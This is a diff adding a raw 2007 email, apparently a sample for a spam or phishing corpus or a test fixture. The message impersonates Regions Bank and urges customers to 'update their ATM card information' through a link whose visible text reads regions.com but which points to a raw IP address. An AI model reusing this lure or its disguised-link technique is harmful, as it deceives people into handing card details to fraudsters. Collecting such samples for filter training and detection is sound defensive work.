@@ -1,0 +1,65 @@
+From nobody Sun Jan 25 13:50:01 2015
+Return-Path: <security@regions.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 41FFA46936
+ for <user@login.example.com>; Thu,  8 Feb 2007 15:17:07 -0500 (EST)
+X-Greylist: delayed 1724 seconds by postgrey-1.27 at mail.example.org;
+ Thu, 08 Feb 2007 15:17:07 EST
+Received: from mail.downunderonline.net.au (mail.downunderonline.net.au
+ [72.3.230.112])
+ by mail.example.org (Postfix) with ESMTP id 19748131FC33
+ for <user@example.com>; Thu,  8 Feb 2007 15:17:07 -0500 (EST)
+Received: (qmail 14854 invoked from network); 8 Feb 2007 13:29:15 -0600
+Received: from unknown (HELO User) (59.1.193.2)
+ by 72.32.18.206 with SMTP; 8 Feb 2007 13:29:14 -0600
+From: "Regions Bank"<security@regions.com>
+Subject: Regions Bank Notification!
+Date: Fri, 9 Feb 2007 04:29:12 +0900
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070208201707.19748131FC33@mail.example.org>
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 776
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<p>
+<img border="0" src="http://www.regions.com/shared/images_global/header_regions_logo.gif" width="246" height="57"></p>
+<p><font face="Verdana" size="2">Dear Regions Bank customer,</font></p>
+<p><font face="Verdana" size="2">In order to be prepared for the smart card 
+upgrade on Visa and MasterCard debit<br>
+and credit cards and to avoid problems with our ATM services, we have recently<br>
+introduced additional security measures and upgraded our software.</font></p>
+<p><font face="Verdana" size="2">The security upgrade will be effective 
+immediately and requires our customers to<br>
+update their ATM card information. Please update your information by following<br>
+the link given below. </font></p>
+<p><font face="Verdana" size="2">
+<a href="http://209.197.151.46/~josh/www.regions.com/">
+http://www.regions.com/</a> </font>
+</p>
+<p><font face="Verdana" size="2">¨ÏRegions Bank Online Banking</font></p>
+<p> </p>
+
+</body>
+
+</html>
